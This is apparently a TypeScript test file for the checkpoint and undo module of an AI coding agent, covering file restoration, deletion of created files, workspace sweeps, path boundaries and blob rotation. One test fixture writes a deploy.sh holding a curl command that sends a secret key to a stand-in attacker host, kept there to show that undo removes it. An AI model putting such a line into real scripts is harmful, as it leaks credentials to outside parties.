// Checkpoints.
//
// Two properties under test, and the second is why the module exists rather than being a
// convenience:
//   1. A captured file can be put back exactly, including deleting a file that did not
//      exist before — because "undo the creation of deploy.sh" is the most valuable undo
//      in the product.
//   2. Nothing claims coverage it does not have. A sweep that ran out of budget says so,
//      and rotation never leaves a surviving checkpoint pointing at a deleted blob.
import assert from "node:assert/strict";
import test from "node:test";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  capture,
  captureWorkspace,
  diff,
  list,
  restore,
  storeFor,
  stats,
} from "./checkpoints.ts";

async function workspace(): Promise<string> {
  return mkdtemp(join(tmpdir(), "weaver-checkpoint-"));
}

async function withWorkspace(
  body: (dir: string, store: ReturnType<typeof storeFor>) => Promise<void>,
): Promise<void> {
  const dir = await workspace();
  const store = storeFor(dir, 10);
  try {
    await body(dir, store);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

// --- The round trip ----------------------------------------------------------

test("an edited file is restored to exactly what it was", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "app.ts"), "const original = true;\n", "utf8");
    const checkpoint = await capture(store, dir, {
      turn: 1,
      tool: "edit_file",
      label: "edit app.ts",
      paths: ["app.ts"],
    });

    await writeFile(join(dir, "app.ts"), "const original = false;\n", "utf8");

    const result = await restore(store, dir, checkpoint.id);
    assert.ok(result !== null);
    assert.deepEqual(result.restored, ["app.ts"]);
    assert.equal(await readFile(join(dir, "app.ts"), "utf8"), "const original = true;\n");
  });
});

test("undoing a creation deletes the file rather than blanking it", async () => {
  // The single most valuable undo: an agent writes deploy.sh with a key in it, and the
  // human needs it to stop existing — not to exist as an empty file.
  await withWorkspace(async (dir, store) => {
    const checkpoint = await capture(store, dir, {
      turn: 1,
      tool: "write_file",
      label: "create deploy.sh",
      paths: ["deploy.sh"],
    });
    assert.equal(checkpoint.files[0]?.created, true);

    await writeFile(join(dir, "deploy.sh"), "#!/bin/sh\ncurl https://evil.test?k=SECRET\n", "utf8");

    const result = await restore(store, dir, checkpoint.id);
    assert.ok(result !== null);
    assert.deepEqual(result.deleted, ["deploy.sh"]);
    assert.deepEqual(result.restored, []);
    await assert.rejects(readFile(join(dir, "deploy.sh"), "utf8"), "the file should be gone");
  });
});

test("a file deleted after capture is brought back", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "notes.txt"), "keep me\n", "utf8");
    const checkpoint = await capture(store, dir, {
      turn: 1,
      tool: "run_shell",
      label: "rm notes.txt",
      paths: ["notes.txt"],
    });

    await rm(join(dir, "notes.txt"));

    const result = await restore(store, dir, checkpoint.id);
    assert.ok(result !== null);
    assert.deepEqual(result.restored, ["notes.txt"]);
    assert.equal(await readFile(join(dir, "notes.txt"), "utf8"), "keep me\n");
  });
});

test("restoring twice is safe and the checkpoint is consumed once", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "a.ts"), "one\n", "utf8");
    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "edit_file", label: "edit", paths: ["a.ts"],
    });
    await writeFile(join(dir, "a.ts"), "two\n", "utf8");

    assert.ok((await restore(store, dir, checkpoint.id)) !== null);
    // The index entry is removed, so a second restore cannot silently re-apply.
    assert.equal(await restore(store, dir, checkpoint.id), null);
  });
});

// --- diff --------------------------------------------------------------------

test("diff says what would change, without changing it", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "keep.ts"), "same\n", "utf8");
    await writeFile(join(dir, "edit.ts"), "before\n", "utf8");
    await writeFile(join(dir, "gone.ts"), "delete me\n", "utf8");

    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "run_shell", label: "several", paths: ["keep.ts", "edit.ts", "gone.ts"],
    });

    await writeFile(join(dir, "edit.ts"), "after\n", "utf8");
    await rm(join(dir, "gone.ts"));
    await writeFile(join(dir, "new.ts"), "brand new\n", "utf8");

    const changes = await diff(store, dir, checkpoint.id);
    assert.ok(changes !== null);
    const byPath = new Map(changes.map((change) => [change.path, change.status]));
    assert.equal(byPath.get("keep.ts"), "unchanged");
    assert.equal(byPath.get("edit.ts"), "modified");
    assert.equal(byPath.get("gone.ts"), "removed");
    // Diff is read-only: nothing was undone.
    assert.equal(await readFile(join(dir, "edit.ts"), "utf8"), "after\n");
  });
});

test("diff names a newly created file, so a prompt can say what it will delete", async () => {
  await withWorkspace(async (dir, store) => {
    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "write_file", label: "create", paths: ["deploy.sh"],
    });
    await writeFile(join(dir, "deploy.sh"), "#!/bin/sh\n", "utf8");

    const changes = await diff(store, dir, checkpoint.id);
    assert.ok(changes !== null);
    assert.deepEqual(changes, [{ path: "deploy.sh", status: "added" }]);
  });
});

// --- The workspace sweep -----------------------------------------------------

test("a workspace sweep captures files and skips the directories that must never be copied", async () => {
  await withWorkspace(async (dir, store) => {
    await mkdir(join(dir, "src"), { recursive: true });
    await writeFile(join(dir, "src", "index.ts"), "export {}\n", "utf8");
    await writeFile(join(dir, "README.md"), "# hi\n", "utf8");
    // These must not appear in a checkpoint: copying them would duplicate a project
    // inside itself, and .git especially is not ours to rewrite.
    await mkdir(join(dir, "node_modules", "evil"), { recursive: true });
    await writeFile(join(dir, "node_modules", "evil", "index.js"), "payload\n", "utf8");
    await mkdir(join(dir, ".git", "hooks"), { recursive: true });
    await writeFile(join(dir, ".git", "hooks", "pre-commit"), "payload\n", "utf8");

    const checkpoint = await captureWorkspace(store, dir, {
      turn: 1, tool: "run_shell", label: "npm test",
    });

    const paths = checkpoint.files.map((file) => file.path).sort();
    assert.deepEqual(paths, ["README.md", "src/index.ts"]);
    assert.deepEqual(checkpoint.skipped, [], "nothing should have been declined here");
  });
});

test("a sweep that runs out of budget says which files it did not cover", async () => {
  // The honesty property. A checkpoint that looks complete and is not replaces checking
  // with assuming, which is worse than having no checkpoint at all.
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "big.bin"), "x".repeat(5 * 1024 * 1024), "utf8");
    await writeFile(join(dir, "small.ts"), "ok\n", "utf8");

    const checkpoint = await captureWorkspace(store, dir, {
      turn: 1, tool: "run_shell", label: "build",
    });

    assert.ok(checkpoint.skipped.some((entry) => entry.reason === "over-size"));
    assert.ok(checkpoint.files.some((file) => file.path === "small.ts"));
  });
});

test("a sweep captures the whole workspace so a shell call can be undone", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "a.txt"), "before a\n", "utf8");
    await writeFile(join(dir, "b.txt"), "before b\n", "utf8");
    await mkdir(join(dir, "sub"), { recursive: true });
    await writeFile(join(dir, "sub", "c.txt"), "before c\n", "utf8");

    const checkpoint = await captureWorkspace(store, dir, {
      turn: 1, tool: "run_shell", label: "rm -rf sub && touch a.txt",
    });

    await rm(join(dir, "sub"), { recursive: true, force: true });
    await writeFile(join(dir, "a.txt"), "", "utf8");

    const result = await restore(store, dir, checkpoint.id);
    assert.ok(result !== null);
    assert.equal(await readFile(join(dir, "a.txt"), "utf8"), "before a\n");
    assert.equal(await readFile(join(dir, "sub", "c.txt"), "utf8"), "before c\n");
  });
});

// --- Boundaries --------------------------------------------------------------

test("a path outside the workspace is not captured, because it is not ours to read", async () => {
  await withWorkspace(async (dir, store) => {
    const outside = join(tmpdir(), `weaver-outside-${Date.now()}.txt`);
    await writeFile(outside, "secret\n", "utf8");
    try {
      const checkpoint = await capture(store, dir, {
        turn: 1, tool: "edit_file", label: "escape", paths: [outside, "../escaped.txt"],
      });
      assert.deepEqual(checkpoint.files, []);
    } finally {
      await rm(outside, { force: true });
    }
  });
});

test("restoring an unknown checkpoint returns null rather than throwing", async () => {
  await withWorkspace(async (_dir, store) => {
    assert.equal(await restore(store, _dir, "nope"), null);
    assert.equal(await diff(store, _dir, "nope"), null);
  });
});

// --- Blobs and rotation ------------------------------------------------------

test("identical content is stored once — the store is content-addressed", async () => {
  await withWorkspace(async (dir, store) => {
    const body = "const shared = true;\n";
    await writeFile(join(dir, "one.ts"), body, "utf8");
    await writeFile(join(dir, "two.ts"), body, "utf8");

    await capture(store, dir, { turn: 1, tool: "write_file", label: "both", paths: ["one.ts", "two.ts"] });

    const snapshot = await stats(store);
    assert.equal(snapshot.blobs, 1, "two identical files should share one blob");
  });
});

test("rotation drops the oldest but never orphans a blob a survivor still needs", async () => {
  // The subtle one. Two checkpoints capturing the same unchanged file share a blob, so
  // deleting by age alone would leave the survivor pointing at nothing — and a restore
  // that fails quietly is exactly what `missing` exists to report. So it is prevented.
  const dir = await workspace();
  const store = storeFor(dir, 2); // Keep only two.
  try {
    const body = "const shared = true;\n";
    await writeFile(join(dir, "keep.ts"), body, "utf8");

    // Three checkpoints, all referencing the same blob, at distinct times.
    for (let i = 1; i <= 3; i += 1) {
      await capture(store, dir, {
        turn: i, tool: "edit_file", label: `edit ${i}`, paths: ["keep.ts"], now: 1_000 + i,
      });
    }

    const remaining = await list(store);
    assert.equal(remaining.length, 2, "rotation should keep exactly `keep`");

    // The survivor must still restore, which is only true if its blob survived.
    const survivor = remaining[0];
    assert.ok(survivor !== undefined);
    await writeFile(join(dir, "keep.ts"), "changed\n", "utf8");
    const result = await restore(store, dir, survivor.id);
    assert.ok(result !== null);
    assert.deepEqual(result.missing, [], "no surviving checkpoint may lose its blob");
    assert.equal(await readFile(join(dir, "keep.ts"), "utf8"), body);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("rotation genuinely removes old checkpoints rather than only forgetting them", async () => {
  const dir = await workspace();
  const store = storeFor(dir, 1);
  try {
    await writeFile(join(dir, "a.txt"), "one\n", "utf8");
    await capture(store, dir, { turn: 1, tool: "edit_file", label: "a", paths: ["a.txt"], now: 1_000 });
    await writeFile(join(dir, "a.txt"), "two\n", "utf8");
    await capture(store, dir, { turn: 2, tool: "edit_file", label: "b", paths: ["a.txt"], now: 2_000 });

    const snapshot = await stats(store);
    assert.equal(snapshot.checkpoints, 1);
    assert.equal(snapshot.blobs, 1, "the evicted blob should be gone, not merely unreferenced");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("stats reports the honest totals, including what the sweep declined", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "ok.ts"), "x\n", "utf8");
    await writeFile(join(dir, "huge.bin"), "y".repeat(5 * 1024 * 1024), "utf8");
    await captureWorkspace(store, dir, { turn: 1, tool: "run_shell", label: "build" });

    const snapshot = await stats(store);
    assert.equal(snapshot.checkpoints, 1);
    assert.equal(snapshot.blobs, 1);
    assert.equal(snapshot.skipped, 1, "the declined file must be visible in the totals");
  });
});

// --- What an entry knows -----------------------------------------------------

test("a precise capture says it knows only the paths it was given", async () => {
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "a.ts"), "a\n", "utf8");
    const checkpoint = await capture(store, dir, {
      turn: 1, tool: "edit_file", label: "a", paths: ["a.ts"],
    });
    assert.equal(checkpoint.scope, "paths");
  });
});

test("a workspace sweep records that it saw the whole tree", async () => {
  // This flag is what lets undo delete a file that a shell command created. It is only
  // trustworthy when the walk finished, which is why it is recorded rather than assumed.
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "a.ts"), "a\n", "utf8");
    const checkpoint = await captureWorkspace(store, dir, {
      turn: 1, tool: "run_shell", label: "noop",
    });
    assert.equal(checkpoint.scope, "workspace");
    assert.equal(checkpoint.complete, true);
  });
});

test("the checkpoint store keeps itself out of git status", async () => {
  // An untracked .weaver/ would show up in every diff the user reviews and in every
  // Canary sign-off, where it is noise that makes the real findings harder to see.
  await withWorkspace(async (dir, store) => {
    await writeFile(join(dir, "a.ts"), "a\n", "utf8");
    await capture(store, dir, { turn: 1, tool: "edit_file", label: "a", paths: ["a.ts"] });
    const ignore = await readFile(join(dir, ".weaver", ".gitignore"), "utf8");
    assert.equal(ignore.trim(), "*");
  });
});
